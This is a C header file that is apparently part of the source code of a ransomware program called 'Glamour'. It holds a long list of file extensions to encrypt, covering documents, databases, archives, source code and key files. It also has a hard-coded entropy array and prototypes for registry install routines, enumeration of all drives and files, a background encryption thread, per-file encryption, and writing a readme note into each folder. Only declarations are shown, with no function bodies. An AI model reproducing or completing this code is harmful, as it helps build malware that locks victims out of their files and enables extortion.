#ifndef __GLAMOUR_HEADER__
#define __GLAMOUR_HEADER__

#define DEBUG

#ifdef DEBUG
	#include <stdio.h>
	#include <stdlib.h>
#endif

/* -- list of file extensions to encrypt -- */
const char *extensions[] = { 
	".12m", ".3ds",  ".3dx",  ".4ge", ".4gl", ".a86", ".abc",  ".acd",  ".ace",  ".act",
	".ada", ".adi",  ".aex",  ".af3", ".afd", ".ag4", ".aif",  ".aifc", ".aiff", ".ain",
	".aio", ".ais",  ".akf",  ".alv", ".amp", ".ans", ".apa",  ".apo",  ".app",  ".arc",
	".arh", ".arj",  ".arx",  ".asc", ".ask", ".asm", ".bak",  ".bas",  ".bcb",  ".bcp",
	".bdb", ".bib",  ".bpr",  ".bsa", ".btr", ".bup", ".bwb",  ".bz2",  ".c86",  ".cac",
	".cbl", ".cdb",  ".cdr",  ".cgi", ".cmd", ".cnt", ".cob",  ".col",  ".cpp",  ".cpt",
	".crp", ".cru",  ".csc",  ".css", ".csv", ".ctx", ".cvs",  ".cwb",  ".cwk",  ".cxe",
	".cxx", ".cyp",  ".db0",  ".db1", ".db2", ".db3", ".db4",  ".dba",  ".dbb",  ".dbc",
	".dbd", ".dbe",  ".dbf",  ".dbk", ".dbm", ".dbo", ".dbq",  ".dbt",  ".dbx",  ".dfm",
	".dic", ".dif",  ".djvu", ".dmd", ".doc", ".dok", ".dot",  ".dox",  ".dsc",  ".dwg",
	".dxf", ".dxr",  ".eps",  ".exp", ".fas", ".fax", ".fdb",  ".fla",  ".flb",  ".fox",
	".frm", ".frm",  ".frt",  ".frx", ".fsl", ".gif", ".gtd",  ".gzip", ".hjt",  ".hog",
	".hpp", ".htm",  ".html", ".htx", ".ice", ".icf", ".inc",  ".ish",  ".iso",  ".jad",
	".jar", ".java", ".jpeg", ".jpg", ".jsp", ".key", ".kwm",  ".lst",  ".lwp",  ".lzh",
	".lzs", ".lzw",  ".mak",  ".man", ".maq", ".mar", ".mbx",  ".mdb",  ".mdf",  ".mid",
	".myd", ".obj",  ".old",  ".p12", ".pak", ".pas", ".pdf",  ".pem",  ".pfx",  ".pgp",
	".php", ".php3", ".php4", ".pkr", ".pm3", ".pm4", ".pm5",  ".pm6",  ".png",  ".pps",
	".ppt", ".prf",  ".prx",  ".psd", ".pst", ".pwa", ".pwl",  ".pwm",  ".pwp",  ".pxl",
	".rar", ".res",  ".rle",  ".rmr", ".rnd", ".rtf", ".safe", ".sar",  ".skr",  ".sln",
	".sql", ".swf",  ".tar",  ".tbb", ".tex", ".tga", ".tgz",  ".tif",  ".tiff", ".txt",
	".wps", ".xcr",  ".xls",  ".xml", ".zip"
};

/* -- global variables -- */
BYTE   wincode[4];
DWORD  win32  = 0;
DWORD  tickCount = 0;
HANDLE vfiles = INVALID_HANDLE_VALUE;
HANDLE myProcessHeap = NULL;

/* -- crypto variables -- */
BYTE ga = 0;
BYTE gb = 0;
BYTE key[256];

BYTE entropy[24] = {
	0x30, 0x4F, 0x9D, 0x67, 0xBF, 0x05, 0xD6, 0x25, 0xC5, 0xF5, 0x12, 0x39,
	0xB6, 0x60, 0xBE, 0x43, 0xB2, 0xFC, 0x4D, 0x0A, 0x8D, 0xC0, 0xC9, 0x87
};


/* -- install routines -- */
DWORD WINAPI file_encrypt_thread(LPVOID none);
void install_reg_wincode();
void install_reg_win32();

/* -- file recursion routines -- */
void enum_drives();
void enum_files(char *path);
void check_extension(char *filename);

/* -- file encryption routines -- */
void do_main_file_work();
void encrypt_file(char *filename);
void write_readme_txt(char *fullpath);

/* -- utils -- */
WCHAR *mb2wc(char *str, int len);
CHAR  *wc2mb(WCHAR *str, int len);
int GenRandomFillByte(int ival, int uival);

/* -- crypto -- */
void init_buffer();
BYTE encode(BYTE x);
void process_byte(BYTE x);

#endif
